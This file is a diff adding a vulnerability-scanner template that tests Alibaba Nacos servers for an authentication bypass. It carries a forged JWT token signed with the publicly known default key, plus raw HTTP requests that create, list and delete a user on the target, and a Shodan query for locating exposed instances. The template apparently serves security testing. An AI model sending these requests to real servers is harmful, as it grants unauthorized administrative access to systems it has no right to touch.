@@ -1,0 +1,45 @@
+id: nacos-create-user
+
+info:
+  name: Alibaba Nacos - Unauthorized Account Creation
+  author: SleepingBag945
+  severity: high
+  description: |
+    Nacos uses a fixed JWT token key to authenticate users in the default configuration. Since Nacos is an open source project, the key is publicly known, so unauthorized attackers can use this fixed key to forge any user identity Log in to Nacos to manage and operate background interface functions.
+  reference:
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/nacos-token-create-user.yaml
+  classification:
+    cpe: cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: alibaba
+    product: nacos
+    shodan-query: title:"Nacos"
+  tags: misconfig,nacos,unauth,bypass,instrusive
+
+http:
+  - raw:
+      - |
+        POST /nacos/v1/auth/users/?username={{randstr_1}}&password={{randstr_2}}&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /nacos/v1/auth/users?pageNo=1&pageSize=9&search=blur&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        DELETE /nacos/v1/auth/users/?username={{randstr_1}}&accessToken={{token}} HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      token:
+        - eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OTl9.-isk56R8NfioHVYmpj4oz92nUteNBCN3HRd0-Hfk76g
+    attack: pitchfork
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && contains(body_1,'create user ok!')"
+          - "status_code_3 == 200 && contains(body_3,'delete user ok!')"
+        condition: and
+# digest: 4a0a00473045022100b3970f3b9132eb9453b5492a4f6e332fd7fbe4878f80e2d76e09af9d1483dbdd022065b272b997fd05972f333efac30e4ea18b34ea44a87cdb68f2ddf0f4d3119d5d:922c64590222798bb761d5b6d8e72950
